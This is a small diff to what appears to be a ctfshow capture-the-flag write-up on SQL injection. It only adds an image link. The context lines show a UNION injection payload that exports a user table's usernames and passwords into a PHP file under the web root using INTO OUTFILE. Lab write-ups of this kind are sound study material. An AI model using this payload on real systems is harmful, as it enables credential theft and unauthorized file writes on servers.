@@ -263,3 +263,4 @@ Note: If we use `INTO OUTFILE`, we need writing rights of the files firstly.
 ```
 select username, password from ctfshow_user5 where username != 'flag' and id = '999' union select username, password from ctfshow_user5 into outfile '/var/www/html/flag1.php' # 'limit 1;
 ```
+![[Pasted image 20241225151726.png]]
